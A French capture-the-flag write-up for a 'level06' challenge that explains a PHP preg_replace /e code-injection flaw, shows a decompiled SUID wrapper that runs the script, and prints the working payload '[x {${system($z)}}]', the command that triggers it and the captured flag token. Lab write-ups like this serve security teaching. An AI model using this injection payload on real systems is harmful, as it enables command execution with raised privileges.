# level06:

on voit un exécutable `level06` et un fichier `level06.php`

```php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

Après des recherches on voit qu'il y'a un `/e` qui est utilisé dans le regex et qui est une faille car il exécute la chaine de remplacement comme du code php équivaut à `eval()`

j'essaie à de nombreuse reprise sans succès d'exploiter cette faille

Puis je me dis que peut etre l'exec ne correspond pas au programme php voyons avec ghidra:

```c
int main(int argc, char **argv, char **envp)
{
	char *file_name;
	gid_t rgid;
	uid_t ruid;
	char *args[5];

	file_name = strdup("");
	args[3] = strdup("");
	if (argv[1] != NULL) {
		free(file_name);
		file_name = strdup(argv[1]);
		if (argv[2] != NULL) {
			free(args[3]);
			args[3] = strdup(argv[2]);
		}
	}

	rgid = getegid();
	ruid = geteuid();
	setresgid(rgid, rgid, rgid);
	setresuid(ruid, ruid, ruid);
	args[0] = "/usr/bin/php";
	args[1] = "/home/user/level06/level06.php";
	args[2] = file_name;
	args[4] = NULL;
	execve("/usr/bin/php", args, envp);
	return 0;
}
```

Je vois que l'exécutable exécute notre programme level06.php mais a les droits SUID ce qui signifie qu'on va pouvoir exploiter le regex si on encapsule

Je ressaie quelque chose comme ca:

Je crée un fichier test dans tmp

script
```
[x system($z)]
```

j'execute:

```bash
./level06 /tmp/test getflag
```

et j'obtiens:
```
system(getflag)
```

Maintenant si j'encapsule ca dans une variable c'est gagné

```
[x {${system($z)}}]
```


```bash
./level06 /tmp/test getflag
```
```
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```